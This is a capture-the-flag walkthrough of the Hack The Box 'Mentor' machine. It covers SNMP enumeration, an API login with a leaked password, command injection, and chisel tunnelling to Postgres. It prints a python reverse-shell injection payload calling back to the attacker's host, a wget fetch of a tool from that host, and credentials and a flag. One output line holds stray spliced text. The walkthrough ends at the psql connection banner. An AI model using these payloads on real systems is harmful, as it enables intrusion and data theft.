---
title: Mentor HTB Walkthrough
tags: ["htb", "security", "penetration testing", "ctf", "snmp", "docker", "python"]
date: 2023-03-11
author: emdwyer
---

![Awkward](./mentor.png)

## Introduction

As you'll see, we get to visit SNMP enumeration (not once, but twice!) and deal with a flaky web server which we fail to enumerate initially. Once the web server is accessible after a well deserved break, we manage to find some APIs to enumerate eventually leading to command injection and a reverse shell.

It's here we realise we're in a fairly minimal Docker container with not many tools at our disposal.  We look through the code of the running Flask app, finding a hard coded PostgreSQL connection string.

Next, we learn to tunnel Postgres connections through our Docker container using chisel.  This lets us gain a foothold on the Docker host where we are able to then privesc to get the root flag.

## Enumeration

As per usual, we start with an `nmap` scan to see which common ports/services are accessible:

```bash
$nmap -sC -sV -o nmap/initial 10.10.11.193
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 17:13 AEDT
Nmap scan report for 10.10.11.193
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds
```

I next added `10.10.11.193 mentorquotes.htb` to `/etc/hosts`, but could not navigate to http://mentorquotes.htb

Running `gobuster`, which found nothing, it appears once opening port 80, no data is returned whatsoever by the server. It was here I felt a little stuck, but as I found out later, the web server was flaky thanks to people enumerating and hammering it with requests -- which was fixed by a reboot.

Before I realised how screwy the web server was, I dug deep thinking I was missing **something**, and next ran a UDP scan which showed SNMP running. Simple Network Management Protocol (SNMP) is a network protocol used for monitoring and managing network devices, OSes and basically whatever other device or service may support SNMP.  Using `nmap`, we see SNMP is indeed running on our target, and accessible via the 'public' community string:

```bash
$sudo nmap -sUV -F 10.10.11.193
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 17:27 AEDT
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.020s latency).
Not shown: 59 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: mentor

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 224.00 seconds
```

SNMP consists of a hierarchical namespace known as a *management information base* (MIB).  The namespace consists of Object IDs (OIDs), each of which is a variable that can either be read (get) or written (set) -- assuming the correct permissions are given, of course.

The OID notation consist of numbers separated by a dot/period.  We can use [braa](https://github.com/mteg/braa) to enumerate SNMP -- using the OID prefix `1.3.6.1`, which is `iso.org.dod.internet` (common for most devices).  This will effectively go through and get each OID one by one, or 'walk' the OID tree, providing us information about the target.

We assume the community string 'public' here, which is used like a password to access SNMP.  Ideally, you should not be using well known default community strings when relying on SNMP.  With this in mind, let's enumerate everything under `1.3.6.1.*`:

```
$braa public@10.10.11.193:.1.3.6.1.*
10.10.11.193:21ms:.0:Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.10.11.193:20ms:.0:.10
10.10.11.193:30ms:.0:8641015
10.10.11.193:52ms:.0:Me <admin@mentorquotes.htb>
10.10.11.193:21ms:.0:mentor
10.10.11.193:21ms:.0:Sitting on the Dock of the Bay
10.10.11.193:21ms:.0:72
10.10.11.193:20ms:.0:2
10.10.11.193:21ms:.1:.1
10.10.11.193:21ms:.2:.1
10.10.11.193:25ms:.3:.1
10.10.11.193:20ms:.4:.1
10.10.11.193:21ms:.5:.1
10.10.11.193:20ms:.6:.49
10.10.11.193:21ms:.7:.50
10.10.11.193:26ms:.8:.4
10.10.11.193:26ms:.9:.3
10.10.11.193:25ms:.10:.92
10.10.11.193:20ms:.1:The SNMP Management Architecture MIB.
10.10.11.193:21ms:.2:The MIB for Message Processing and Dispatching.
10.10.11.193:21ms:.3:The management information definitions for the SNMP User-based Security Model.
10.10.11.193:21ms:.4:The MIB module for SNMPv2 entities
10.10.11.193:20ms:.5:View-based Access Control Model for SNMP.
10.10.11.193:21ms:.6:The MIB module for managing TCP implementations
10.10.11.193:23ms privileges with enum data, the rest is a matter :.7:The MIB module for managing UDP implementations
10.10.11.193:22ms:.8:The MIB module for managing IP and ICMP implementations
10.10.11.193:20ms:.9:The MIB modules for managing SNMP Notification, plus filtering.
10.10.11.193:21ms:.10:The MIB module for logging SNMP Notifications.
10.10.11.193:21ms:.1:1
10.10.11.193:22ms:.2:1
10.10.11.193:20ms:.3:1
10.10.11.193:49ms:.4:1
10.10.11.193:21ms:.5:1
10.10.11.193:21ms:.6:1
10.10.11.193:21ms:.7:1
10.10.11.193:41ms:.8:1
10.10.11.193:20ms:.9:2
10.10.11.193:20ms:.10:2
10.10.11.193:42ms:.0:8644480
10.10.11.193:41ms:.0:� 
10.10.11.193:44ms:.0:393216
10.10.11.193:54ms:.0:BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0

10.10.11.193:45ms:.0:0
10.10.11.193:66ms:.0:228
10.10.11.193:20ms:.0:0
10.10.11.193:20ms:.0:Error [2] No such name.
```

So, we see what appears to be an Ubuntu machine running kernel 5.15.0-56, along with some admin contact details, and the command line parameters passed to the kernel on boot.

We get a little information, but not enough.  So I next attempted to brute force SNMP community strings with `nmap`, to see if any other strings existed providing us more information, or even allowing us to write (set) and gain further access to the machine:

```bash
$sudo nmap -sU -p 161 --script=snmp-brute 10.10.11.193 --script-args=snmp-brute.communitiesdb=/home/zara/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 17:44 AEDT
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.019s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|_  public - Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds
```

We've got an open port 80 that doesn't really respond, and some system information retrieved via SNMP, but unfortunately no other community strings.  It was here, at the end of the weekend, I took a break frustrated and not knowing how to proceed.

I revisited this machine a few days later, and found it had been reset.. with the web server now accessible:

![](./assets/2023-02-18-16-46-30-image.png)

Looking around, it appeared the above was a static site only, with no user inputs we could submit from the browser.

Running `gobuster` again to see if any other URLs exist:

```bash
$gobuster dir -u "http://mentorquotes.htb" -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mentorquotes.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/18 16:47:21 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 281]

===============================================================
2023/02/18 16:47:38 Finished
===============================================================
```

So `/server-status` just gives us a forbidden error. Let's try a vhost scan (where our HTTP requests use the `Host` header), using the `-r` flag to follow redirects and remove false positives:

```bash
$gobuster vhost -u "http://mentorquotes.htb" -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://mentorquotes.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/zara/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/18 17:01:21 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api.mentorquotes.htb (Status: 404) [Size: 22]
```

If I hit the domain with `api.mentorquotes.htb` in the Host header:

```bash
$curl -H "Host: api.mentorquotes.htb" -v http://mentorquotes.htb
*   Trying 10.10.11.193:80...
* Connected to mentorquotes.htb (10.10.11.193) port 80 (#0)
> GET / HTTP/1.1
> Host: api.mentorquotes.htb
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Sat, 18 Feb 2023 06:06:05 GMT
< Server: uvicorn
< content-length: 22
< content-type: application/json
< 
* Connection #0 to host mentorquotes.htb left intact
{"detail":"Not Found"}
```

So far, it seems like the machine is running Ubuntu with Linux kernel 5.15, and [Uvicorn](https://www.uvicorn.org/) as the web server

If I hit `/server-status`, using the same Host header, the response indicates Apache 2.4.52:

```bash
$curl -H "Host: api.mentorquotes.htb" -v http://mentorquotes.htb/server-status
*   Trying 10.10.11.193:80...
* Connected to mentorquotes.htb (10.10.11.193) port 80 (#0)
> GET /server-status HTTP/1.1
> Host: api.mentorquotes.htb
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 18 Feb 2023 06:13:15 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Content-Length: 285
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at api.mentorquotes.htb Port 80</address>
</body></html>
* Connection #0 to host mentorquotes.htb left intact
```

While searching for "enumerate uvicorn", I stumbled across this page from 0xdf on an old HTB machine named BackendTwo: [HTB: BackendTwo | 0xdf hacks stuff](https://0xdf.gitlab.io/2022/05/02/htb-backendtwo.html)

I thought I would try [feroxbuster](https://github.com/epi052/feroxbuster), a fast discovery tool written in Rust, with the same wordlist as 0xdf's walkthrough.  We're basically enumerating URL paths similar to gobuster, while having the `Host: api.mentorquotes.htb` header set.  We can pass the `-H` flag to `gobuster dir` to achieve the same, but sometimes it's nice to try out new things:

```bash
$feroxbuster -u http://mentorquotes.htb -H "host: api.mentorquotes.htb" -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mentorquotes.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ host:  api.mentorquotes.htb
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
307        0l        0w        0c http://mentorquotes.htb/admin
200       31l       62w      969c http://mentorquotes.htb/docs
307        0l        0w        0c http://mentorquotes.htb/users
307        0l        0w        0c http://mentorquotes.htb/quotes
403        9l       28w      285c http://mentorquotes.htb/server-status
```

If we `curl -H "Host: api.mentorquotes.htb" http://mentorquotes.htb/docs`, we see a [swagger-ui](https://swagger.io/tools/swagger-ui/) interface.  Rather than pasting boring and unreadable curl output, I installed the [Modify Header Value](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/) extension for Firefox, which allows you to create domain based rules for custom HTTP headers.  So I set `Host: api.mentorquotes.htb` and browsing to http://mentorquotes.htb/docs , we get the following swagger UI:

![](./assets/2023-02-18-19-47-58-image.png)

## Foothold

Given the helpful swagger UI above, we've gone some distance with enumeration, can we gain more access via the API?
I POSTed to `/auth/signup` in order to create an account, which gave me a 201 (created) response:

```
{
  "email": "foo@bar.com",
  "username": "foobar",
  "password": "foobarbaz"
}
```

Now, logging in -- I adapted the `curl` command swagger UI generates, adding in the `Host` header:

```bash
$curl -X 'POST'   'http://mentorquotes.htb/auth/login'   -H 'accept: application/json'   -H 'Content-Type: application/json' -H 'Host: api.mentorquotes.htb'   -d '{
  "email": "foo@bar.com",
  "username": "foobar",
  "password": "foobarbaz"
}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZvb2JhciIsImVtYWlsIjoiZm9vQGJhci5jb20ifQ.Q2yx8BqrikpPRF6hVz1BTgOLvzUODVUW0FvcsrYfBhs"
```

We get a JWT back for our session.  I tried using the JWT in the Authorization header field to get users from within BurpSuite:

```
GET /users/ HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/users/4
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZvb2JhciIsImVtYWlsIjoiZm9vQGJhci5jb20ifQ.Q2yx8BqrikpPRF6hVz1BTgOLvzUODVUW0FvcsrYfBhs
DNT: 1
Connection: close
```

Okay, it appears our JWT works, but we obviously don't have the required admin privilege:

```
HTTP/1.1 403 Forbidden
Date: Sun, 19 Feb 2023 06:03:27 GMT
Server: uvicorn
content-length: 54
content-type: application/json
Connection: close

{"detail":"Only admin users can access this resource"}
```

The top of the OpenAPI spec at http://api.mentorquotes.htb/openapi.json shows a contact named `james` with email `james@mentorquotes.htb`:

```json
    "contact": {
      "name": "james",
      "url": "http://mentorquotes.htb",
      "email": "james@mentorquotes.htb"
    },
```

I tried a few things here, such as signing up again, but passing `"admin": true` in the signup JSON payload and a few other variations to see if I could force the creation of an administrator account.  I wasn't successful however.

Next I wondered if we could clobber this account by creating it again?  This was working off the assumption the signup endpoint will do an upsert on the underlying database  (so if the data already exists, it will update over the top of the existing record), and perhaps the existing user has a role in a separate table -- so signing up will retain their admin permissions..  Maybe.. Hopefully..

```
POST /auth/signup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Content-Type: application/json
Origin: http://api.mentorquotes.htb
Content-Length: 89
DNT: 1
Connection: close
Pragma: no-cache
Cache-Control: no-cache

{
  "email": "james2@mentorquotes.htb",
  "username": "james",
  "password": "foobarbaz"
}
```

This gave a 201 (created) response, so we try logging in, and we get a token!:

```
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mentorquotes.htb/docs
Content-Type: application/json
Origin: http://mentorquotes.htb
Content-Length: 90
DNT: 1
Connection: close

{
  "email": "james2@mentorquotes.htb",
  "username": "james",
  "password" :"foobarbaz"
}
```

```
HTTP/1.1 200 OK
Date: Sun, 19 Feb 2023 06:36:46 GMT
Server: uvicorn
content-length: 155
content-type: application/json
access-control-allow-origin: *
access-control-allow-credentials: true
Connection: close

"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lczJAbWVudG9ycXVvdGVzLmh0YiJ9.o7zBN7X869DZ2c68qXrSRCgeVmtRipgQgzI3hp30WNI"
```

Now, let's try to hit the `/admin` endpoint with the above JWT:

```
HTTP/1.1 403 Forbidden
Date: Sun, 19 Feb 2023 06:39:01 GMT
Server: uvicorn
content-length: 54
content-type: application/json
Connection: close

{"detail":"Only admin users can access this resource"}
```

Damn.. Hitting the `/admin` endpoint, with what we hoped was an admin-level JWT gives the same error message as above.  I created a new account with the `admin` username, and used the JWT from logging in -- but same results.

Not convinced I had completely enumerated SNMP, I started to question `nmap`'s snmp-bruteforce script, and looked at it in `/usr/share/nmap/scripts/snmp-brute.nse`, but couldn't see any version information.

I found [SNMP-Brute](https://github.com/SECFORCE/SNMP-Brute), which apparently *"Brute forces both version 1 and version 2c SNMP community strings*.  Using the same common SNMP community strings word list as before:

```bash
$./snmpbrute.py --file ~/SecLists/Discovery/SNMP/common-snmp-community-strings.txt -b -t 10.10.11.193
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['public', 'private', '0', '0392a0', '1234', '2read', '4changes', 'ANYCOM', 'Admin', 'C0de', 'CISCO', 'CR52401', 'IBM', 'ILMI', 'Intermec', 'NoGaH$@!', 'OrigEquipMfr', 'PRIVATE', 'PUBLIC', 'Private', 'Public', 'SECRET', 'SECURITY', 'SNMP', 'SNMP_trap', 'SUN', 'SWITCH', 'SYSTEM', 'Secret', 'Security', 'Switch', 'System', 'TENmanUFactOryPOWER', 'TEST', 'access', 'adm', 'admin', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'apc', 'bintec', 'blue', 'c', 'cable-d', 'canon_admin', 'cc', 'cisco', 'community', 'core', 'debug', 'default', 'dilbert', 'enable', 'field', 'field-service', 'freekevin', 'fubar', 'guest', 'hello', 'hp_admin', 'ibm', 'ilmi', 'intermec', 'internal', 'l2', 'l3', 'manager', 'mngt', 'monitor', 'netman', 'network', 'none', 'openview', 'pass', 'password', 'pr1v4t3', 'proxy', 'publ1c', 'read', 'read-only', 'read-write', 'readwrite', 'red', 'regional', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'san-fran', 'sanfran', 'scotty', 'secret', 'security', 'seri', 'snmp', 'snmpd', 'snmptrap', 'solaris', 'sun', 'superuser', 'switch', 'system', 'tech', 'test', 'test2', 'tiv0li', 'tivoli', 'trap', 'world', 'write', 'xyzzy', 'yellow'] community strings ...
10.10.11.193 : 161     Version (v1):    public
10.10.11.193 : 161     Version (v2c):    public
10.10.11.193 : 161     Version (v2c):    internal
Waiting for late packets (CTRL+C to stop)

Trying identified strings for READ-WRITE ...

Identified Community strings
    0) 10.10.11.193    public (v1)(RO)
    1) 10.10.11.193    public (v2c)(RO)
    2) 10.10.11.193    internal (v2c)(RO)
Finished!
```

So we found community string also 'internal' works in addition to 'public' -- but somehow `nmap` didn't find this before (?!?!).  I'm assuming here that `snmpbrute` properly brute forces SNMP v2c, whereas `nmap` does not -- the 'internal' community string is just SNMP v2c, not v1.

Let's enumerate with `snmpwalk` -- redirecting the output to snmp.txt, given there is a **lot** of output, much more than the public community string.  We make sure to specify version 2c, given the newly found community string is *only* version 2c:

```bash
 $snmpwalk -v 2c -c internal 10.10.11.193 > snmp.txt
```

I will spare you the gory details, as the output contains a lot -- running processes, and basically everything imaginable.  A very quick scroll through gave a lot of noise, and wasn't very interesting.

Let's grep for anything interesting that may help us get access to the system:

```bash
grep -E 'user|login|pass|root|admin' snmp.txt 
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
HOST-RESOURCES-MIB::hrSWRunName.912 = STRING: "systemd-logind"
HOST-RESOURCES-MIB::hrSWRunName.1696 = STRING: "login.sh"
HOST-RESOURCES-MIB::hrSWRunName.2104 = STRING: "login.py"
HOST-RESOURCES-MIB::hrSWRunPath.912 = STRING: "/lib/systemd/systemd-logind"
HOST-RESOURCES-MIB::hrSWRunParameters.1696 = STRING: "/usr/local/bin/login.sh"
HOST-RESOURCES-MIB::hrSWRunParameters.2104 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

It looks like from the above maybe `kj23sadkj123as0-d213` is a password being passed as an argument to a python script located at `/usr/local/bin/login.py`.

I tried SSHing into the machine with usernames `admin@mentorquotes.htb` and `james@mentorquotes.htb` using `kj23sadkj123as0-d213` as the password, but failed.

Let's try the auth endpoint against the exposed API again:

```
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mentorquotes.htb/docs
Content-Type: application/json
Origin: http://mentorquotes.htb
Content-Length: 100
DNT: 1
Connection: close

{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password" :"kj23sadkj123as0-d213"
}
```

```
HTTP/1.1 200 OK
Date: Sun, 19 Feb 2023 07:05:44 GMT
Server: uvicorn
content-length: 154
content-type: application/json
access-control-allow-origin: *
access-control-allow-credentials: true
Connection: close

"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```
We have a JWT..  Now let's try the `/users` endpoint again.  We use `-s` for silent output, `-H` to specify our Host and Authorization headers.  Note we specify the url http://api.mentorquotes.htb/users, as the main domain will 302 redirect here anyway:

```bash
$curl -s -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Host: api.mentorquotes.htb" http://api.mentorquotes.htb/users | jq
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  },
  {
    "id": 4,
    "email": "foo@bar.com",
    "username": "foobar"
  },
  {
    "id": 5,
    "email": "james@foo.bar",
    "username": "james"
  },
  {
    "id": 6,
    "email": "admin@mentorquotes.htb",
    "username": "admin"
  },
  {
    "id": 7,
    "email": "james2@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 8,
    "email": "admin2@mentorquotes.htb",
    "username": "admin"
  },
  {
    "id": 9,
    "email": "admin3@mentorquotes.htb",
    "username": "mentor"
  },
  {
    "id": 10,
    "email": "james22@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 11,
    "email": "james222@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 12,
    "email": "james2@foo.bar",
    "username": "james"
  }
]
```

Not great, but a little progress -- we have admin privileges to the API and we can see all the junk accounts I created trying to get access initially, including the account for james and finally what looks like a service account.  We can also reach the `/admin` endpoint now -- which appears to be a rather crude API service discovery endpoint:

```bash
$curl -s -L -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Host: api.mentorquotes.htb" http://api.mentorquotes.htb/admin | jq
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
```

GET `/admin/backup` gives a *Method Not Allowed* error.  POST with an empty JSON body gives:

```
HTTP/1.1 422 Unprocessable Entity
Date: Sun, 19 Feb 2023 07:21:38 GMT
Server: uvicorn
content-length: 88
content-type: application/json
Connection: close

{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

Let's specify a path, seeing as though the input validation fails on this field:

```
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
DNT: 1
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Content-Length: 30

{
"path":   "/etc/passwd"
}
```

```
HTTP/1.1 200 OK
Date: Sun, 19 Feb 2023 07:22:30 GMT
Server: uvicorn
content-length: 16
content-type: application/json
Connection: close

{"INFO":"Done!"}
```

So maybe this file is backed up somewhere we can access? Or perhaps we can command inject?

I tried different variations off blind command injection using `sleep` , and sure enough - the server hung for around 10 seconds with the below payload:

```json
{"path": "/etc/passwd;sleep 10;"}
```

So it looks like our app shells out to read and back up the file somewhere, and a simple semi-colon `;` allows us to inject/append other arbitrary shell commands.

I had issues with bash (minimal docker container with only `sh` or `ash` -- possibly alpine?), so I basically created a `sh` reverse shell by using python within our command injected path in the JSON payload:

```json
{
"path": "/etc/passwd;python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.33\",3322));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
}
```

And looking back at our listening netcat instance we get a reverse shell, from which we can read the user flag!:

```bash
$nc -lvnp 3322
Listening on 0.0.0.0 3322
Connection received on 10.10.11.193 40504
/app # ls /home        
ls /home
svc
/app # ls /home/svc
ls /home/svc
user.txt
/app # cat /home/svc/user.txt
cat /home/svc/user.txt
aa7da69a22677e9f78e4cfcc8d213108
```

## Privilege Escalation

As suspected above, it looks like we're in a docker container, based on the limited environment, and the `/app` volume/working directory containing the application's Dockerfile:

```bash
/app # ls -la 
ls -la
total 24
drwxr-xr-x    1 0        root          4096 Nov 10 16:00 .
drwxr-xr-x    1 0        root          4096 Feb 19 05:32 ..
-rw-r--r--    1 0        root          1024 Jun 12  2022 .Dockerfile.swp
-rw-r--r--    1 0        root           522 Nov  3 12:58 Dockerfile
drwxr-xr-x    1 0        root          4096 Nov 10 16:00 app
-rw-r--r--    1 0        root           672 Jun  4  2022 requirements.txt
PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee
/app # cat Dockerfile 
FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]
```

Poking around the app's python files, we see a default/fallback connection string which is used in the absence of `DATABASE_URL` in the environment:

```bash
/app/app # cat db.py
.. snip ..
# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

Here's where I did a very quick crash course on tunnelling, to see if I could somehow tunnel the postgres connection above through to my own machine..  We have a minimal docker container with no `psql`, so connecting to the postgres instance with the credentials in the connection string above is not easy without first tunnelling the connection through our own machine.

I found [chisel](https://github.com/jpillora/chisel/), a go-based app that allows you to tunnel TCP connections over HTTP.

0xdf's quick chisel cheatsheet here was quite useful:[Tunneling with Chisel and SSF | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

I ran `python -m 'http.server' 8888` on my machine, and `wget http://10.10.14.33:8888/chisel` to download the chisel binary into the container.

I now run a `chisel` server on my Parrot VM, listening on port 6969:

```bash
$./chisel server -p 6969 --reverse
2023/02/19 20:57:04 server: Reverse tunnelling enabled
2023/02/19 20:57:04 server: Fingerprint 6Zclibd5UaElkkiDQ/SX1oGWqKStwyRE0MJrh6y+ss4=
2023/02/19 20:57:04 server: Listening on http://0.0.0.0:6969
```

Now, back in the container:

```shell
/app # ./chisel client 10.10.14.33:6969 R:5555:172.22.0.1:5432
```

This will connect chisel as a client back to my Parrot VM on 10.10.14.33:6969 via a HTTP connection.  In a more locked down environment, you would likely select more common ports, such as 80, 443, 8080, etc (why is a container communicating out to the interwebs on port 6969?)

With this outbound connection from the container to my own machine in place, the `R:5555:172.22.0.1:5432` syntax above basically will set a *remote* listening port on 5555 on my Parrot VM, which tunnels/forwards from my machine **back** through to 172.22.0.1:5432 on the target (container), which is the postgres instance our container's running application connects to.

So now my Parrot VM will be listening on port 5555, tunnelled back through the outbound HTTP connection our container established via the `chisel client` command we ran inside the container, and finally to the postgres instance.  Let's try connecting -- so from our Parrot VM, we run:

```bash
$psql postgres://postgres:postgres@localhost:5555/mentorquotes_db
psql (13.9 (Debian 13.9-0+deb11u1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

